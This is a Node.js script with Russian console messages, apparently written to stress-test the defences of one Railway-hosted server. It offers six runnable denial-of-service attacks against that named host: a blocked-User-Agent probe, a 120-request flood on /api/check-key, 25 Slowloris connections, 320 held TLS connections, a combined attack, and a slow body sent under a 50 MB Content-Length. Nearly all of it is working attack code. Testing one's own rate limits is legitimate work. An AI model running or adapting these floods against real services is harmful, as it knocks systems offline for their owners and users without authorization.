const tls = require('tls');
const https = require('https');

const HOST = 'rkslservermain01-production.up.railway.app';
const PORT = 443;

const args = process.argv.slice(2);
const testNum = parseInt(args[0], 10);

if (isNaN(testNum) || testNum < 1 || testNum > 6) {
  console.log('Использование: node test-aggressive.js <номер_теста>');
  console.log('Доступные тесты:');
  console.log('  1 - Агрессивный Bad User-Agent (raw TLS)');
  console.log('  2 - Супер-флуд Rate Limiter (очень агрессивно)');
  console.log('  3 - Multi Slowloris (много медленных соединений)');
  console.log('  4 - Жёсткое удержание соединений (300+)');
  console.log('  5 - Комбинированная атака');
  console.log('  6 - Большой Content-Length + slow body');
  process.exit(0);
}

console.log(`\n🚀 Запуск агрессивного теста #${testNum} на ${HOST}\n`);

switch (testNum) {
  case 1: testBadUA(); break;
  case 2: testSuperFlood(); break;
  case 3: testMultiSlowloris(); break;
  case 4: testHeavyConnections(); break;
  case 5: testCombinedAttack(); break;
  case 6: testBigContentLength(); break;
}

// ====================== ТЕСТ 1 ======================
function testBadUA() {
  console.log('[Тест 1] Raw TLS + запрещённый User-Agent...');

  const socket = tls.connect(PORT, HOST, { rejectUnauthorized: false }, () => {
    socket.write('GET / HTTP/1.1\r\n');
    socket.write(`Host: ${HOST}\r\n`);
    socket.write('User-Agent: curl/7.81.0\r\n'); // должен быть заблокирован
    socket.write('Accept: */*\r\n\r\n');
  });

  socket.on('data', data => {
    console.log('[-] Получен ответ:', data.toString().slice(0, 200));
  });

  socket.on('error', e => {
    if (e.code === 'ECONNRESET' || e.message.includes('hang up')) {
      console.log('[+] УСПЕХ: Соединение моментально разорвано сервером');
    } else {
      console.log('[-] Ошибка:', e.message);
    }
  });

  socket.on('end', () => console.log('[+] Соединение закрыто сервером'));
}

// ====================== ТЕСТ 2 ======================
function testSuperFlood() {
  console.log('[Тест 2] Супер-флуд на /api/check-key (параллельно)...');
  const total = 120;
  let count = 0;

  for (let i = 0; i < total; i++) {
    setTimeout(() => {
      const req = https.request({
        hostname: HOST,
        port: PORT,
        path: '/api/check-key',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }, res => {
        let body = '';
        res.on('data', c => body += c);
        res.on('end', () => {
          count++;
          if (res.statusCode === 429) console.log(`[+] 429! (${count}/${total})`);
          else console.log(`[${res.statusCode}] ${count}/${total}`);
        });
      });

      req.on('error', () => { count++; });
      req.write(JSON.stringify({ key: 'STRESS_TEST', scriptId: 'NBTF_ACTIVE' }));
      req.end();
    }, i * 8); // очень плотный поток
  }
}

// ====================== ТЕСТ 3 ======================
function testMultiSlowloris() {
  console.log('[Тест 3] Запускаем 25 Slowloris-соединений...');
  const sockets = [];
  const count = 25;

  for (let i = 0; i < count; i++) {
    const socket = tls.connect(PORT, HOST, { rejectUnauthorized: false }, () => {
      socket.write('POST /api/check-key HTTP/1.1\r\n');
      socket.write(`Host: ${HOST}\r\n`);
      socket.write('Content-Type: application/json\r\n');
      socket.write('Content-Length: 100000\r\n\r\n'); // большой размер
    });

    // шлём по 1 байту каждые 1.5 секунды
    const interval = setInterval(() => {
      try { socket.write('X'); } catch { clearInterval(interval); }
    }, 1500);

    socket.on('error', () => clearInterval(interval));
    sockets.push(socket);
  }

  setTimeout(() => {
    console.log(`[+] Держим ${sockets.filter(s => !s.destroyed).length} slow-соединений`);
  }, 15000);
}

// ====================== ТЕСТ 4 ======================
function testHeavyConnections() {
  console.log('[Тест 4] Открываем 320 соединений...');
  let active = 0;
  const target = 320;

  for (let i = 0; i < target; i++) {
    const s = tls.connect(PORT, HOST, { rejectUnauthorized: false }, () => {
      active++;
      setInterval(() => { try { s.write('\r\n'); } catch {} }, 2000);
    });

    s.on('close', () => active--);
    s.on('error', () => {});
  }

  setTimeout(() => {
    console.log(`\nУдерживается: ${active}/${target} соединений`);
  }, 8000);
}

// ====================== ТЕСТ 5 ======================
function testCombinedAttack() {
  console.log('[Тест 5] Комбинированная атака (Bad UA + Slow + Flood)');
  testBadUA();
  testMultiSlowloris();
  setTimeout(() => testSuperFlood(), 3000);
}

// ====================== ТЕСТ 6 ======================
function testBigContentLength() {
  console.log('[Тест 6] Большой Content-Length + очень медленное тело...');

  const socket = tls.connect(PORT, HOST, { rejectUnauthorized: false }, () => {
    socket.write('POST /api/check-key HTTP/1.1\r\n');
    socket.write(`Host: ${HOST}\r\n`);
    socket.write('Content-Type: application/json\r\n');
    socket.write('Content-Length: 50000000\r\n\r\n'); // 50MB заявлено
  });

  let sent = 0;
  const interval = setInterval(() => {
    if (sent > 1000000) { // отправляем ~1MB медленно
      clearInterval(interval);
      return;
    }
    try {
      socket.write('{"data":"' + 'X'.repeat(1024) + '"}');
      sent += 1024;
    } catch {
      clearInterval(interval);
    }
  }, 800);
}
